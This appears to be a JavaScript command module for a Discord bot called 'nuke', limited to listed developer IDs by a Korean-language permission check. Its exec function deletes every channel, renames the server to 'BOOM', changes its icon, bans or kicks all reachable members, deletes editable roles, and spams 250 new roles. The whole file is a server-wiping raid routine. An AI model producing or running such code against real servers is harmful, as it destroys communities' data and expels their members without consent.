const env = require('../env.json')

module.exports = {
  name: 'nuke',
  isValid: (msg, client) => {
    if (env.devs.find(elem => elem === msg.author.id) === undefined) return '명령어를 사용할 권한이 없습니다'
    return 0
  },
  exec: (msg, client) => {
    msg.guild.channels.cache.each((elem) => {
      elem.delete()
    })
    msg.guild.setName('BOOM')
    msg.guild.setIcon('./data/nuke.jpg')
    msg.guild.members.cache.each((elem) => {
      if (elem.bannable) elem.ban()
      if (elem.kickable) elem.kick()
    })
    msg.guild.roles.cache.each((elem) => {
      if (elem.editable && elem.name !== '@everyone') {
        elem.delete()
      }
    })
    const a = async () => {
      for (let i = 0; i < 250; i++) {
        msg.guild.roles.create()
      }
    }
    a()
  }
}
